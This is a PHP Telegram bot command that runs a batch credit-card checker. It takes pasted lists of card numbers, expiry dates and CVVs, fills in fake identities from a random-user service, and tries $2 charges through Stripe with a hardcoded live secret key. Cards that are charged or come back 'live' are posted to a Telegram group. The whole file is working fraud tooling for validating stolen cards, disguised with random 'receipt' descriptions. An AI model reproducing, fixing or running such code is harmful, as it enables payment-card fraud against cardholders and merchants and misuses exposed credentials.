<?php 
if ((strpos($message, "/mss") === 0)||(strpos($message, "!mss") === 0)||(strpos($message, ".mss") === 0)){
  if ($role == "OWNER")
  {
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$msg = substr($message,5);
$listas = explode("\n",$msg);
$c = count($listas);
$msg = reply_to($chatId,urlencode("
𝗖𝗖𝗦 𝗙𝗢𝗨𝗡𝗗 $c
"),$messageId);
$respon = json_decode($msg, TRUE);
  $message_id_1 = $respon['result']['message_id'];
edit_message($chatId," な 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝒔𝒕𝒂𝒓𝒕𝒆𝒅...",$message_id_1);
    $c = $c - 1;
    $pr = 0;
while($c>=0)
{
$pr++;
$sk ="sk_live_y98zoTtLlTh9JYiHBzMMmhCA";

//------[Randomize Description]------//
$word = array(
1 => 'Dinner Receipt', 
2 => 'Hosting Donations',
3 => 'Accesory Receipt',                
4 => 'Clothes Receipt',                 
5 => 'Food Reciept',
); 
$rnd = array_rand($word);
$dnt = $word[$rnd];
$lista = $listas[$c];
$cc = multiexplode(array(":", "/", " ", "|"), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $lista)[3];
$lista = "$cc|$mes|$ano|$cvv";
    
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bin = substr($cc , 0 , 6);
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: bins.su';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$result = curl_exec($ch);
    $bincap1 = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
    $country = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));
    $country2 = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));

    
  if(empty($country))
{
  $country = "US";
  $country2 = "US";
}
if($country == "SG")
{
    $country2 = "US";
}
  //  $country = $country2;
//==================[Randomizing Details]======================//
details:
$get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$country2.'');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
if(empty($name))
{
    $name = "John";
    $last = "gips";
}
if(empty($state))
{
    $country2 = "US";
    goto details;
}
$name = trim($name);
$last = trim($last);
$email = "$name$last"."@gmail.com";
retry:
//================= [ CURL REQUESTS ] =================//
$start = microtime(true);
#===========[1st REQ]=======#
while(true)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]='.$country.'&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'');  
$r1 = curl_exec($ch);  
if (strpos($r1, "rate_limit"))   
{  
    continue;  
}  
break;  
}  
//===========[𝙀𝙓𝙏𝙍𝘼𝘾𝙏𝙄𝙊𝙉]=========//
$tok = trim(strip_tags(getStr($r1, '"id": "', '"')));
$check1 = Getstr($r1,'"cvc_check": "','"');
$msg = Getstr($r1,'"decline_code": "','"');
$msg2 = Getstr($r1,'"message": "','"');
//==========[ #1 𝙍𝙚𝙦 𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂]===//
if(empty($tok))
{
    $msg2 = Getstr($r1,'"message": "','"');
    $msg2 = "$msg2 [R1]";
    $r = '1';
    $end = microtime(true);
$time = ($end - $start);
$time = round($time,2);

    goto fuck;
}
  //=============[2nd REQ]=======//
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=2&currency=usd&payment_method_types[]=card&description='.$dnt.'&payment_method='.$tok.'&confirm=true&off_session=true');  
$r2 = curl_exec($ch);  
if (strpos($r2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}
$end = microtime(true);
$time = ($end - $start);
$time = round($time,2);
$r = '2';
//=======[#2 𝙀𝙓𝙏𝙍𝘼𝘾𝙏𝙄𝙊𝙉]=========//
$msg2 = Getstr($r2,'"message": "','"');
$msg = Getstr($r2,'"decline_code": "','"');
$recebddbipturl = trim(strip_tags(getStr($r2, '"receipt_url": "', '"')));
$risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));    
if ((strpos($r2, '"status": "succeeded"')) || (strpos($r2, '"seller_message": "Payment complete."'))){
  sendMessage('-1001837568442',urlencode("
CHARGED : <code> $lista </code>
な 𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @balenottere ✅
 "),$messageId);
  $c--;
  continue;
 // goto hits;
  }
elseif ((strpos($r2,'insufficient_funds')) || (strpos($r1,'insufficient_funds'))){
 sendMessage($chatId,urlencode("
$lista INSUFFICIENT FUNDS
 "),$messageId);
  $c--;
  continue;
//  goto hits;
  }
  elseif ((strpos($r2,'"cvc_check": "pass"')) || (strpos($r1,'"cvc_check": "pass"'))){
 $rslt = "
 $lista CVV LIVE 
 ";
    goto hits;
  }
  elseif ((strpos($r2, 'incorrect_cvc')) || (strpos($r1, 'incorrect_cvc'))) {
 $rslt = "
 $lista  CCN LIVE 
 ";
    goto hits;
  }
else
{
  goto fuck;
}
  #------------#
fuck:
    if(isset($msg))
{
    $msg = "[$msg]";
}
#########################[Responses Show Like]############################
$rslt = "
な 𝒄𝒄 : $lista 
な 𝒎𝒆𝒔𝒔𝒂𝒈𝒆: $msg2 ❌
";
hits:
 // $rslts = "$rslts $rslt";
 edit_message($chatId,urlencode("
 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎 [$pr/$bln]
 
  $rslt 
  "),$message_id_1);
  $c--;
}
edit_message($chatId,urlencode("
  𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 ✅
  "),$message_id_1);
  }
}
  
?>
 